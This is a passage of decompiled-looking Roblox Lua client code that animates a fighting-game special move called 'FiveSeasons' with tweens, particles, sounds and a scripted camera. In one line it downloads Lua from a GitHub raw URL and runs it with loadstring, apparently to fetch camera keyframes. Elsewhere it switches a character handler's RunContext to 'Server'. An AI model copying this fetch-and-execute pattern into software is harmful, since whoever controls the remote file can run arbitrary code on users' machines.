                                        CFrame = _Character6.HumanoidRootPart.CFrame * CFrame.new(0.5640029907226563, -2.9619998931884766, -4.41802978515625) * CFrame.Angles(0, 0, -1.5707963267948966),
                                    }):Play()
                                    task.delay(0.083, function()
                                        local v2741 = game.ReplicatedStorage.Resources.KJEffects.LegSweepHit.Hit:Clone()

                                        table.insert(u2737, v2741)

                                        v2741.Parent = _Character6.HumanoidRootPart

                                        v2741['15']:Emit(v2741['15'].Name)
                                        u6:AddItem(v2741, 0.5)
                                    end)
                                    u2705(_Character6, 'FollowUpKick', 1, v2739)
                                else
                                    local u2742 = u2738.SweepCresc:Clone()

                                    u2742.CFrame = _Character6.HumanoidRootPart.CFrame * CFrame.new(0, -2.632, 0) * CFrame.Angles(0, 0.6981317007977318, 3.141592653589793)
                                    u2742.Parent = workspace.Thrown

                                    u10:Create(u2742.Decal, TweenInfo.new(0.133, Enum.EasingStyle.Linear), {Transparency = 0.8}):Play()
                                    task.delay(0.133, function()
                                        u10:Create(u2742.Decal, TweenInfo.new(0.217, Enum.EasingStyle.Linear), {Transparency = 1}):Play()
                                    end)
                                    u10:Create(u2742, TweenInfo.new(0.183, Enum.EasingStyle.Linear), {
                                        CFrame = _Character6.HumanoidRootPart.CFrame * CFrame.new(0, -2.632, 0) * CFrame.Angles(0, 2.6179938779914944, 3.141592653589793),
                                    }):Play()
                                    task.delay(0.183, function()
                                        u10:Create(u2742, TweenInfo.new(0.167, Enum.EasingStyle.Linear), {
                                            CFrame = _Character6.HumanoidRootPart.CFrame * CFrame.new(0, -2.632, 0) * CFrame.Angles(0, 4.886921905584122, 3.141592653589793),
                                        }):Play()
                                    end)
                                    task.delay(0.033, function()
                                        local u2743 = u2738.particlespinner:Clone()

                                        u2743.CFrame = _Character6.HumanoidRootPart.CFrame * CFrame.new(0, -3, 0) * CFrame.Angles(0, 0.1484577061746377, 0)
                                        u2743.Parent = workspace.Thrown
                                        u2743.Attachment.ParticleEmitter.Enabled = true
                                        u2743.Attachment.rocks.Enabled = true

                                        u10:Create(u2743, TweenInfo.new(0.167, Enum.EasingStyle.Linear), {
                                            CFrame = _Character6.HumanoidRootPart.CFrame * CFrame.new(0, -2.632, 0) * CFrame.Angles(0, 2.9670597283903604, 0),
                                        }):Play()
                                        task.delay(0.167, function()
                                            u2743.Attachment.ParticleEmitter.Enabled = false
                                            u2743.Attachment.rocks.Enabled = false

                                            u6:AddItem(u2743, 9)
                                        end)
                                    end)
                                end
                            end)
                        end
                        local function u3043()
                            if u31 then
                                local _Folder5 = Instance.new('Folder', u201())

                                _Folder5.Name = 'FiveSeasonsUseTwice'

                                u6:AddItem(_Folder5, 0.3)

                                return
                            elseif not u201():FindFirstChild('DoingMove') then
                                local _Folder6 = Instance.new('Folder')

                                _Folder6.Name = 'NoRotate'
                                _Folder6.Parent = u201()

                                u122()
                                u251()

                                local _BodyVelocity10 = Instance.new('BodyVelocity')

                                _BodyVelocity10.MaxForce = Vector3.new(90000, 0, 90000)
                                _BodyVelocity10.Velocity = Vector3.new(0, 0, 0)
                                _BodyVelocity10.Parent = _LocalPlayer3.Character.HumanoidRootPart
                                u29 = Instance.new('Sound')
                                u29.Volume = 2
                                u29.Parent = workspace
                                u29.SoundId = 'rbxassetid://18460952794'

                                u29:Play()

                                local _Sound18 = Instance.new('Sound')

                                _Sound18.Volume = 5
                                _Sound18.Parent = _LocalPlayer3.Character.Torso
                                _Sound18.SoundId = 'rbxassetid://18460863844'

                                _Sound18:Play()
                                task.delay(3.2, function()
                                    local _Sound19 = Instance.new('Sound')

                                    _Sound19.Volume = 6
                                    _Sound19.Parent = _LocalPlayer3.Character.Head
                                    _Sound19.SoundId = 'rbxassetid://18460893321'

                                    _Sound19:Play()
                                end)
                                task.delay(6.95, function()
                                    local _Attachment4 = Instance.new('Attachment')

                                    _Attachment4.CFrame = _LocalPlayer3.Character.Torso.CFrame
                                    _Attachment4.Parent = _Terrain

                                    local _Sound20 = Instance.new('Sound')

                                    _Sound20.Volume = 3
                                    _Sound20.Parent = _Attachment4
                                    _Sound20.SoundId = 'rbxassetid://18461671633'

                                    _Sound20:Play()
                                end)
                                u706(u1077.FiveSeasons.Startup, true)
                                _LocalPlayer3.Character:WaitForChild('Humanoid'):WaitForChild('Animator')

                                local u2752 = nil

                                _LocalPlayer3.Character.CharacterHandler.Client.RunContext = 'Server'

                                task.delay(8.25, function()
                                    u2752:Disconnect()
                                    _BodyVelocity10:Destroy()

                                    local _CurrentCamera4 = workspace.CurrentCamera
                                    local _Character7 = _LocalPlayer3.Character

                                    _Character7.HumanoidRootPart.CFrame = CFrame.new(0, 5, 0)
                                    _Character7.HumanoidRootPart.Anchored = true

                                    local _ = _Character7.PrimaryPart
                                    local _Part8 = Instance.new('Part')

                                    _Part8.Transparency = 1
                                    _Part8.CanCollide = false
                                    _Part8.Size = Vector3.new(1, 1, 1, 0)
                                    _Part8.CanTouch = false
                                    _Part8.CanQuery = false

                                    local _BodyVelocity11 = Instance.new('BodyVelocity')

                                    _BodyVelocity11.MaxForce = Vector3.new(1, 1, 1, 0) * 100000
                                    _BodyVelocity11.Velocity = Vector3.new(0, 0, 0, 0)
                                    _BodyVelocity11.Parent = _Part8
                                    _Part8.CFrame = workspace.CurrentCamera.CFrame
                                    _Part8.CFrame = CFrame.lookAlong(_Part8.Position, _Part8.CFrame.LookVector * Vector3.new(1, 0, 1, 0))
                                    _Part8.Parent = workspace.Thrown

                                    local _CurrentCamera5 = workspace.CurrentCamera

                                    _CurrentCamera5.CameraType = Enum.CameraType.Scriptable

                                    local _Vector3Value = Instance.new('Vector3Value')
                                    local v2759 = tick()
                                    local _NumberValue2 = Instance.new('NumberValue')

                                    _NumberValue2.Value = 0

                                    local _NumberValue3 = Instance.new('NumberValue')

                                    _NumberValue3.Value = 125

                                    local _NumberValue4 = Instance.new('NumberValue')

                                    _NumberValue4.Value = 100

                                    u10:Create(_NumberValue4, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Value = 0}):Play()
                                    u10:Create(_NumberValue3, TweenInfo.new(10, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Value = 0}):Play()
                                    u10:Create(_NumberValue2, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
                                        Value = -90,
                                    }):Play()
                                    u10:Create(_CurrentCamera5, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {FieldOfView = 40}):Play()

                                    local u2763 = v2759
                                    local v2765 = shared.loop(function()
                                        local v2764 = tick() - u2763

                                        u2763 = tick()
                                        _CurrentCamera5.CameraType = Enum.CameraType.Scriptable
                                        _BodyVelocity11.Velocity = _BodyVelocity11.Velocity:lerp(_Character7.Humanoid.MoveDirection * _NumberValue3.Value + Vector3.new(0, _NumberValue4.Value, 0), 1 - 5e-7 ^ v2764)
                                    end, 90)
                                    local v2767 = u12.RenderStepped:Connect(function(p2766)
                                        _CurrentCamera5.CFrame = _CurrentCamera5.CFrame:lerp(_Part8.CFrame * CFrame.Angles(math.rad(_NumberValue2.Value), 0, 0), 1 - 0.00005 ^ p2766)
                                    end)
                                    local v2768 = _Character7
                                    local v2769, v2770, v2771 = pairs(_Character7.GetDescendants(v2768))
                                    local v2772 = _BodyVelocity11
                                    local v2773 = _NumberValue3
                                    local v2774 = _Part8
                                    local v2775 = _Character7
                                    local u2776 = {}

                                    while true do
                                        local v2777, v2778 = v2769(v2770, v2771)

                                        if v2777 == nil then
                                            break
                                        end

                                        v2771 = v2777

                                        if v2778:IsA('BasePart') then
                                            u2776[v2778] = v2778.CastShadow
                                            v2778.CastShadow = false
                                        end
                                    end

                                    u31 = true

                                    local v2779 = tick()

                                    repeat
                                        task.wait()
                                    until tick() - v2779 > 5 or u201():FindFirstChild('FiveSeasonsUseTwice')

                                    task.delay(0.75, function()
                                        local v2780, v2781, v2782 = pairs(u2776)

                                        while true do
                                            local v2783

                                            v2782, v2783 = v2780(v2781, v2782)

                                            if v2782 == nil then
                                                break
                                            end

                                            v2782.CastShadow = v2783
                                        end
                                    end)

                                    u31 = false

                                    v2775:PivotTo(v2774.CFrame)
                                    v2767:Disconnect()
                                    v2765()
                                    _Vector3Value:Destroy()
                                    v2773:Destroy()
                                    v2772:Destroy()
                                    v2774:Destroy()
                                    v2775:PivotTo(v2774.CFrame)

                                    _LocalPlayer3.Character.HumanoidRootPart.Anchored = false

                                    local _ = workspace.CurrentCamera.CFrame * CFrame.Angles(math.rad(90), 0, 0)
                                    local _BodyVelocity12 = Instance.new('BodyVelocity')

                                    _BodyVelocity12.MaxForce = Vector3.new(1, 1, 1, 0) * 400000000
                                    _BodyVelocity12.Velocity = Vector3.new(0, 0, 0, 0)
                                    _BodyVelocity12.Parent = _LocalPlayer3.Character.HumanoidRootPart

                                    local v2785 = u706(u1077.FiveSeasons.Ready, true)

                                    v2785.Stopped:Connect(u131)
                                    v2785.Stopped:Connect(function()
                                        _BodyVelocity12:Destroy()

                                        workspace.CurrentCamera.FieldOfView = 70

                                        shared.SetCore(true)
                                    end)

                                    local v2786 = {
                                        char = _LocalPlayer3.Character,
                                        bp = 10,
                                        id = 10,
                                    }

                                    workspace.CurrentCamera.FieldOfView = 65

                                    local _char3 = v2786.char
                                    local _ = v2786.id
                                    local _ = v2786.bp
                                    local _PrimaryPart7 = _char3.PrimaryPart

                                    tick()
                                    tick()

                                    local _ = u238.Character
                                    local _PrimaryPart8 = _char3.PrimaryPart
                                    local _BodyVelocity13 = Instance.new('BodyVelocity')

                                    _BodyVelocity13.MaxForce = Vector3.new(1, 1, 1, 0) * 400000000
                                    _BodyVelocity13.Velocity = Vector3.new(0, 0, 0, 0)
                                    _BodyVelocity13.Parent = _PrimaryPart8

                                    shared.sfx({
                                        SoundId = 'rbxassetid://18461820786',
                                        Parent = workspace,
                                        Volume = 7,
                                    }):Play()

                                    local u2791 = nil
                                    local u2792 = false

                                    if u238.Character == _char3 then
                                        local u2793 = u188 or loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/wehatepastebin/refs/heads/main/what5'))()

                                        if not u188 then
                                            u188 = u2793
                                        end

                                        local _CurrentCamera6 = workspace.CurrentCamera

                                        _CurrentCamera6.CameraType = Enum.CameraType.Scriptable

                                        local u2795 = 0
                                        local u2796 = 0
                                        local u2797 = tick()
                                        local u2798 = _LocalPlayer3

                                        u2752 = u12.RenderStepped:Connect(function(p2799)
                                            local v2800 = p2799 * 60

                                            u2795 = u2795 + v2800

                                            local v2801 = tonumber((math.ceil(u2795)))
                                            local v2802 = u2793[v2801 >= 375 and 2000000000 or v2801]

                                            if v2802 and _LocalPlayer3.Character.Parent then
                                                if _CurrentCamera6.CameraType ~= Enum.CameraType.Scriptable then
                                                    _CurrentCamera6.CameraType = Enum.CameraType.Scriptable
                                                end

                                                u2796 = u2796 + v2800

                                                if v2802 then
                                                    _CurrentCamera6.CameraType = 'Scriptable'

                                                    local _CurrentCamera7 = game.Workspace.CurrentCamera
                                                    local _dededededededededededede3, v2805, v2806, v2807, v2808, v2809, v2810, v2811, v2812, v2813, v2814, v2815 = v2802.cframe:match('([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+)')

                                                    _CurrentCamera7.CFrame = u2798.Character.PrimaryPart.CFrame * CFrame.new(tonumber(_dededededededededededede3), tonumber(v2805), tonumber(v2806), tonumber(v2807), tonumber(v2808), tonumber(v2809), tonumber(v2810), tonumber(v2811), tonumber(v2812), tonumber(v2813), tonumber(v2814), tonumber(v2815))

                                                    if tick() - u2797 <= 1 then
                                                        local v2816 = _CurrentCamera6
                                                        local _FieldOfView3 = _CurrentCamera6.FieldOfView

                                                        v2816.FieldOfView = _FieldOfView3 + (v2802.fov - _FieldOfView3) * 0.25
                                                    else
                                                        _CurrentCamera6.FieldOfView = v2802.fov
                                                    end
                                                end
                                            end
                                        end)
                                    end

                                    local _FiveSeasonsFX = u4.Resources.FiveSeasonsFX
                                    local _Thrown5 = workspace.Thrown
                                    local u2820, u2821, u2822

                                    if u238.Character ~= _char3 then
                                        u2820 = nil
                                        u2821 = nil
                                        u2822 = nil
                                    else
                                        u2821 = _FiveSeasonsFX.FXUi:Clone()

                                        local _ = u2821.Vignette
                                        local _ = u2821.Punches

                                        u2822 = u2821.FiveSeasons
                                        u2820 = u2821.FiveSeasonsDots
                                        u2820.ImageTransparency = 1
                                    end

                                    task.delay(1.25, function()
                                        local v2823 = _FiveSeasonsFX.CharFX.FinalArmFXMirrored:Clone()

                                        v2823.Parent = _char3['Left Arm']

                                        task.wait(0.75)

                                        local v2824, v2825, v2826 = pairs(v2823:GetChildren())

                                        while true do
                                            local v2827

                                            v2826, v2827 = v2824(v2825, v2826)

                                            if v2826 == nil then
                                                break
                                            end
                                            if v2827:IsA('ParticleEmitter') then
                                                v2827.Enabled = false
                                            end
                                        end

                                        task.wait(1)
                                        v2823:Destroy()
                                    end)
                                    task.delay(1.35, function()
                                        if u238.Character == _char3 then
                                            local _Vignette = u2821.Vignette

                                            u2821.Parent = u238.PlayerGui

                                            u10:Create(_Vignette, TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {ImageTransparency = 0}):Play()
                                        end
                                    end)
                                    task.delay(1.05, function()
                                        local v2829 = _FiveSeasonsFX.CharFX.TP:Clone()

                                        v2829.Parent = _char3.Torso

                                        local v2830, v2831, v2832 = pairs(v2829:GetChildren())

                                        while true do
                                            local v2833

                                            v2832, v2833 = v2830(v2831, v2832)

                                            if v2832 == nil then
                                                break
                                            end
                                            if v2833:IsA('ParticleEmitter') then
                                                v2833:Emit(v2833:GetAttribute('EmitCount'))
                                            end
                                        end

                                        task.wait(0.5)
                                        v2829:Destroy()
                                    end)
                                    task.delay(1.983, function()
                                        if u2821 then
                                            u2821.Vignette.Visible = false
                                        end

                                        shared.sfx({
                                            SoundId = 'rbxassetid://18461821277',
                                            Parent = workspace,
                                            Volume = 3,
                                        }):Play()
                                        u29:Destroy()

                                        if u2821 then
                                            u2822.Visible = true
                                            u2822.ImageTransparency = 1
                                            u2822.ImageColor3 = Color3.fromRGB(0, 0, 0)

                                            u10:Create(u2822, TweenInfo.new(0.005, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {ImageTransparency = 0}):Play()
                                            u10:Create(u2822, TweenInfo.new(0.25, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {
                                                ImageColor3 = Color3.fromRGB(255, 255, 255),
                                            }):Play()

                                            u2820.Visible = true

                                            u10:Create(u2820, TweenInfo.new(1.4, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {ImageTransparency = 0}):Play()
                                        end

                                        task.wait(1.7)

                                        local v2834

                                        if u2821 then
                                            u2822.Visible = false
                                            u2820.Visible = false
                                            v2834 = _FiveSeasonsFX.GrayScale:Clone()
                                            v2834.Parent = game.Lighting

                                            u10:Create(v2834, TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
                                                Brightness = 0,
                                                Contrast = 0,
                                                Saturation = 0,
                                            }):Play()
                                        else
                                            v2834 = nil
                                        end

                                        local u2835 = _FiveSeasonsFX.FistsModelMirrored:Clone()
                                        local v2836 = u2835

                                        u2835.SetPrimaryPartCFrame(v2836, _char3.HumanoidRootPart.CFrame)
                                        task.delay(4.5, function()
                                            u2835:Destroy()
                                        end)

                                        if u238.Character ~= _char3 then
                                            task.wait(1.45)
                                        end

                                        u2835.Parent = _Thrown5

                                        shared.sfx({
                                            SoundId = 'rbxassetid://18462018744',
                                            Parent = u2835.PrimaryPart,
                                            RollOffMaxDistance = 5000,
                                            Volume = 10,
                                            RollOffMode = Enum.RollOffMode.LinearSquare,
                                        }):Play()

                                        local _Primary = u2835.Primary

                                        task.delay(0.065, function()
                                            u2835.Ring1.Start.Transparency = 0.6

                                            u10:Create(u2835.Ring1.Start, TweenInfo.new(0.55, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                                Size = u2835.Ring1.End.Size,
                                            }):Play()
                                            u10:Create(u2835.Ring1.Start, TweenInfo.new(0.55, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                                CFrame = u2835.Ring1.End.CFrame,
                                            }):Play()
                                            u10:Create(u2835.Ring1.Start, TweenInfo.new(0.55, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {Transparency = 1}):Play()
                                            task.wait(0.15)

                                            u2835.Ring2.Start.Transparency = 0.6

                                            u10:Create(u2835.Ring2.Start, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                                Size = u2835.Ring2.End.Size,
                                            }):Play()
                                            u10:Create(u2835.Ring2.Start, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                                CFrame = u2835.Ring2.End.CFrame,
                                            }):Play()
                                            u10:Create(u2835.Ring2.Start, TweenInfo.new(0.4, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {Transparency = 1}):Play()
                                        end)

                                        local v2838, v2839, v2840 = pairs(_Primary:GetDescendants())
                                        local v2841 = u2835

                                        while true do
                                            local v2842, u2843 = v2838(v2839, v2840)

                                            if v2842 == nil then
                                                break
                                            end

                                            v2840 = v2842

                                            if u2843:IsA('ParticleEmitter') then
                                                task.spawn(function()
                                                    u10:Create(u2843, TweenInfo.new(1.92, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {TimeScale = 0.1}):Play()

                                                    local _ = u238.Character == _char3

                                                    task.wait(1.92)

                                                    u2843.TimeScale = 1
                                                    u2843.Enabled = false
                                                end)
                                            end
                                        end

                                        local v2844, v2845, v2846 = pairs(v2841.Fists:GetDescendants())

                                        while true do
                                            local v2847, u2848 = v2844(v2845, v2846)

                                            if v2847 == nil then
                                                break
                                            end

                                            v2846 = v2847

                                            if u2848:IsA('MeshPart') or u2848:IsA('BasePart') then
                                                task.spawn(function()
                                                    local v2849 = Random.new():NextNumber(1.92, 1.88)

                                                    u10:Create(u2848, TweenInfo.new(v2849, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
                                                        Position = u2848.Position + _Primary.CFrame.LookVector * 28,
                                                    }):Play()

                                                    local _ = u238.Character == _char3

                                                    task.wait(v2849)
                                                    u10:Create(u2848, TweenInfo.new(Random.new():NextNumber(0.23, 0.2), Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
                                                        Position = u2848.Position + _Primary.CFrame.LookVector * 800,
                                                    }):Play()
                                                end)
                                            end
                                        end

                                        local v2850, v2851, v2852 = pairs(v2841.Fists:GetDescendants())

                                        while true do
                                            local v2853, v2854 = v2850(v2851, v2852)

                                            if v2853 == nil then
                                                break
                                            end

                                            v2852 = v2853

                                            if v2854:IsA('MeshPart') and v2854.Name == 'Main' then
                                                local u2855 = v2854:Clone()

                                                u2855.Parent = _Thrown5
                                                u2855.Color = Color3.fromRGB(66, 4, 4)

                                                local v2856 = Random.new():NextNumber(0.45, 0.55)
                                                local _ = u238.Character == _char3

                                                u10:Create(u2855, TweenInfo.new(v2856, Enum.EasingStyle.Cubic, Enum.EasingDirection.InOut), {
                                                    Transparency = 1,
                                                    Size = v2854.Size * 1.085,
                                                }):Play()
                                                task.delay(1, function()
                                                    u2855:Destroy()
                                                end)
                                            end
                                        end

                                        task.wait(1.92)

                                        if v2834 then
                                            v2834:Destroy()
                                        end

                                        local v2857, v2858, v2859

                                        if u2821 then
                                            v2857 = _FiveSeasonsFX.FistsCC.FSRed:Clone()
                                            v2857.Parent = game.Lighting
                                            v2858 = _FiveSeasonsFX.FistsCC.FSWhite:Clone()
                                            v2858.Parent = game.Lighting
                                            v2859 = _FiveSeasonsFX.FistsCC.FSBlack:Clone()
                                            v2859.Parent = game.Lighting
                                        else
                                            v2859 = nil
                                            v2857 = nil
                                            v2858 = nil
                                        end

                                        task.wait(0.008)

                                        if u2821 then
                                            v2858.Enabled = true
                                        end

                                        task.wait(0.02)

                                        if u2821 then
                                            v2858.Enabled = false
                                            v2859.Enabled = true
                                        end

                                        task.wait(0.02)

                                        if u2821 then
                                            v2859.Enabled = false

                                            v2857:Destroy()
                                            v2858:Destroy()
                                            v2859:Destroy()
                                        end
                                        if u2821 then
                                            u2821.White.Visible = true
                                            u2821.White.ImageTransparency = 0

                                            u10:Create(u2821.White, TweenInfo.new(0.18, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {ImageTransparency = 1}):Play()
                                        end

                                        local u2860 = nil
                                        local u2861 = 1
                                        local u2862

                                        if u2821 then
                                            shared.sfx({
                                                SoundId = 'rbxassetid://18462312002',
                                                Parent = workspace,
                                                Volume = 7,
                                            }):Play()

                                            u2862 = u2821.ImpactFrames:GetChildren()

                                            table.sort(u2862, function(p2863, p2864)
                                                local v2865 = tonumber(p2863.Name)
                                                local v2866 = tonumber(p2864.Name)

                                                if v2865 and v2866 then
                                                    return v2865 < v2866
                                                else
                                                    return tostring(p2863.Name) < tostring(p2864.Name)
                                                end
                                            end)
                                        else
                                            u2862 = {}

                                            for v2867 = 1, 40 do
                                                table.insert(u2862, v2867)
                                            end
                                        end
                                        if u238.Character ~= _char3 then
                                            task.wait(0.075)
                                        else
                                            shared.loop(function(p2868)
                                                local v2869 = u2862[u2861]

                                                if v2869 then
                                                    if typeof(v2869) == 'Instance' then
                                                        v2869.AnchorPoint = Vector2.new(0.5, 0.5)
                                                        v2869.Size = UDim2.new(1, 0, 1, 0)
                                                        v2869.Position = UDim2.new(0.5, 0, 0.5, 0)
                                                    end
                                                else
                                                    u2792 = true

                                                    p2868()
                                                end
                                                if u2860 and typeof(u2860) == 'Instance' then
                                                    u2860:Destroy()
                                                end

                                                u2860 = v2869
                                                u2861 = u2861 + 1
                                            end, 26, true)

                                            u238.CameraMinZoomDistance = 85

                                            u10:Create(u238, TweenInfo.new(2, Enum.EasingStyle.Sine), {CameraMinZoomDistance = 0.05}):Play()

                                            local v2870 = tick()
                                            local _CurrentCamera8 = workspace.CurrentCamera
                                            local u2872 = v2870
                                            local u2873 = _CurrentCamera8
                                            local u2874 = nil

                                            u2874 = u12.Heartbeat:Connect(function()
                                                if tick() - u2872 > 0.15 then
                                                    return u2874:Disconnect()
                                                end

                                                u2873.CFrame = CFrame.new(u2873.CFrame.Position, (_PrimaryPart7.CFrame * CFrame.new(0, -40, 0)).Position)
                                            end)
                                        end

                                        u6:AddItem(_BodyVelocity13, 2)

                                        local v2875, v2876 = u725({
                                            orig = _PrimaryPart7.Position,
                                            dir = Vector3.new(0, -1000, 0, 0),
                                        })
                                        local v2877 = not v2875 and (_PrimaryPart7.CFrame * CFrame.new(0.0000524520874, -106.229225, -29.8572197, 0.906307757, 0, -0.42261833, 0, 1, 0, 0.42261833, 0, 0.906307757)).Position or v2876 + Vector3.new(0, 0.20000000298023224, 0, 0)
                                        local u2878 = _FiveSeasonsFX.FinalExplosion:Clone()
                                        local v2879 = u2878

                                        u2878.ScaleTo(v2879, 1.25)

                                        u2878.Parent = workspace.Thrown

                                        local v2880 = u2878

                                        u2878.PivotTo(v2880, CFrame.new(v2877))

                                        u2878.Particles.Enabled.EnabledP.Enabled = true

                                        shared.sfx({
                                            SoundId = 'rbxassetid://18462330981',
                                            Parent = u2878.PrimaryPart,
                                            Volume = 10,
                                            RollOffMaxDistance = 2500,
                                            RollOffMode = Enum.RollOffMode.LinearSquare,
                                        }):Play()
                                        task.delay(10, function()
                                            u2878.Particles.Enabled.EnabledP.Enabled = false

                                            task.wait(10)
                                            u2878:Destroy()
                                        end)

                                        local v2881, v2882, v2883 = pairs(u2878.Particles:GetDescendants())

                                        while true do
                                            local u2884

                                            v2883, u2884 = v2881(v2882, v2883)

                                            if v2883 == nil then
                                                break
                                            end
                                            if u2884:IsA('ParticleEmitter') then
                                                u2884:Emit(u2884:GetAttribute('EmitCount'))
                                                task.spawn(function()
                                                    local _TimeScale = u2884.TimeScale

                                                    u2884.TimeScale = 0.1

                                                    task.wait(0.11)

                                                    u2884.TimeScale = _TimeScale
                                                end)
                                            end
                                        end

                                        if u2821 then
                                            local v2886 = _FiveSeasonsFX.ImpactFrameBlue:Clone()

                                            v2886.Parent = game.Lighting
                                            v2886.Enabled = true

                                            task.wait(0.03)

                                            v2886.Enabled = false
                                        end

                                        local function u2894()
                                            local v2887 = Random.new():NextNumber(0.5, 2.75)
                                            local v2888 = _FiveSeasonsFX.FinalExplosion.SmokeMesh:Clone()
                                            local v2889 = v2888:GetScale()

                                            v2888:ScaleTo(Random.new():NextNumber(v2889 - 0.2, v2889 + 1))

                                            local v2890 = Vector3.new(math.random(0, 360), math.random(0, 360), math.random(0, 360))

                                            v2888:SetPrimaryPartCFrame(CFrame.new(v2888.PrimaryPart.Position) * CFrame.Angles(math.rad(v2890.x), math.rad(v2890.y), (math.rad(v2890.z))))

                                            local _Start20 = v2888.Start
                                            local _End20 = v2888.End
                                            local v2893 = _Start20:Clone()

                                            v2893.Transparency = 0
                                            v2893.Name = 'ClonedMesh'
                                            v2893.Transparency = 0.92
                                            v2893.Parent = workspace.Thrown

                                            u10:Create(v2893, TweenInfo.new(v2887, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {
                                                Size = _End20.Size,
                                                CFrame = _End20.CFrame,
                                            }):Play()
                                            u10:Create(v2893, TweenInfo.new(v2887, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Transparency = 1}):Play()
                                            u10:Create(v2893, TweenInfo.new(v2887 / 4, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
                                                Color = Color3.fromRGB(149, 149, 149),
                                            }):Play()
                                            task.wait(3)
                                            v2893:Destroy()
                                            v2888:Destroy()
                                        end

                                        local _CurrentCamera9 = workspace.CurrentCamera

                                        _LocalPlayer3.Character.CharacterHandler.Client.RunContext = 'Client'

                                        if u2791 then
                                            u2791:Disconnect()
                                        end

                                        _Folder6:Destroy()
                                        shared.SetCore(true, nil, true)

                                        _CurrentCamera9.CameraType = Enum.CameraType.Custom

                                        u10:Create(_CurrentCamera9, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {FieldOfView = 70}):Play()
                                        task.spawn(function()
                                            spawn(u2894)
                                            spawn(u2894)
                                            spawn(u2894)
                                            spawn(u2894)
                                            spawn(u2894)

                                            for _ = 1, 5 do
                                                task.spawn(function()
                                                    local v2896 = Random.new():NextNumber(0.3, 1.75)
                                                    local v2897 = _FiveSeasonsFX.FinalExplosion.WindRing:Clone()
                                                    local v2898 = v2897:GetScale()

                                                    v2897:ScaleTo(Random.new():NextNumber(v2898 - 0.65, v2898 + 0.65))

                                                    local v2899 = math.random(0, 360)

                                                    v2897:SetPrimaryPartCFrame(v2897.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(v2899), 0))

                                                    local _Start21 = v2897.Start
                                                    local _End21 = v2897.End
                                                    local v2902 = _Start21:Clone()

                                                    v2902.Decal.Transparency = 0.85
                                                    v2902.Name = 'ClonedMesh'
                                                    v2902.Parent = workspace.Thrown

                                                    u10:Create(v2902, TweenInfo.new(v2896, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                                                        Size = _End21.Size,
                                                        CFrame = _End21.CFrame,
                                                    }):Play()
                                                    u10:Create(v2902.Mesh, TweenInfo.new(v2896, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {
                                                        Scale = _End21.Mesh.Scale,
                                                    }):Play()
                                                    u10:Create(v2902.Decal, TweenInfo.new(v2896, Enum.EasingStyle.Exponential, Enum.EasingDirection.InOut), {Transparency = 1}):Play()
                                                    task.wait(v2896)
                                                    v2902:Destroy()
                                                    v2897:Destroy()
                                                end)
                                                task.wait(0.04)
                                            end
                                        end)
                                    end)

                                    _CurrentCamera4.FieldOfView = 70
                                end)

                                local _Character8 = _LocalPlayer3.Character
                                local _FiveSeasonsFX2 = u4.Resources.FiveSeasonsFX
                                local _Thrown6 = workspace.Thrown
                                local u2906 = _LocalPlayer3

                                task.spawn(function()
                                    local v2907 = _FiveSeasonsFX2.CharFX.HeatUp:Clone()

                                    v2907.Parent = _Character8.HumanoidRootPart

                                    local v2908, v2909, v2910 = pairs(v2907:GetDescendants())

                                    while true do
                                        local v2911

                                        v2910, v2911 = v2908(v2909, v2910)

                                        if v2910 == nil then
                                            break
                                        end
                                        if v2911:IsA('ParticleEmitter') then
                                            v2911:Emit(v2911:GetAttribute('EmitCount'))
                                        end
                                    end

                                    v2907.Wisps.Enabled = true

                                    task.wait(1)

                                    v2907.Wisps.Enabled = false
                                end)
                                task.delay(1.15, function()
                                    task.spawn(function()
                                        local u2912 = _FiveSeasonsFX2.JumpMeshes:Clone()
                                        local v2913 = u2912

                                        u2912.SetPrimaryPartCFrame(v2913, _Character8.HumanoidRootPart.CFrame)

                                        u2912.Parent = _Thrown6

                                        task.delay(0.075, function()
                                            local v2914, v2915, v2916 = pairs(u2912.Lines:GetDescendants())

                                            while true do
                                                local v2917

                                                v2916, v2917 = v2914(v2915, v2916)

                                                if v2916 == nil then
                                                    break
                                                end
                                                if v2917:IsA('ParticleEmitter') then
                                                    v2917:Emit(v2917.Name)
                                                end
                                            end
                                        end)
                                        task.spawn(function()
                                            local v2918 = u2912.Main:Clone()
                                            local _Start22 = v2918.Start
                                            local _End22 = v2918.End
                                            local v2921 = _Start22:Clone()

                                            v2921.Transparency = 0.95
                                            v2921.Name = 'ClonedMesh'
                                            v2921.Parent = u2912.CurrentTweens

                                            u10:Create(v2921, TweenInfo.new(0.75, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                                CFrame = _End22.CFrame,
                                            }):Play()
